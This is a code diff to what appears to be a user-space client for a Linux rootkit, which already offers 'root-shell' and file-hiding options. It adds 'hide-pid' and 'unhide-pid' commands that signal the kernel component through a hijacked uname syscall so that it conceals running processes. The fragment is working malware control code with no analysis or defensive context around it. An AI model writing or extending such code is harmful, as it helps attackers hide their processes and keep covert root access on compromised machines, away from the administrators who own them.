@@ -17,6 +17,8 @@ static struct option long_options[] = {
 	{"root-shell", 0, 0, 3},
 	{"hide-file", 1, 0, 4},
 	{"unhide-file", 1, 0, 5},
+	{"hide-pid", 1, 0, 6},
+	{"unhide-pid", 1, 0, 7},
 	{0, 0, 0, 0}
 };
 
@@ -134,6 +136,16 @@ int main(int argc, char **argv)
 			break;
 		case 5:
 			unhide_file(optarg);
+			break;
+		case 6:
+			args.mode = HIDE_PID;
+			args.param1 = atoi(optarg);
+			syscall(SYS_uname, &args);
+			break;
+		case 7:
+			args.mode = UNHIDE_PID;
+			args.param1 = atoi(optarg);
+			syscall(SYS_uname, &args);
 			break;
 		default:
 			break;
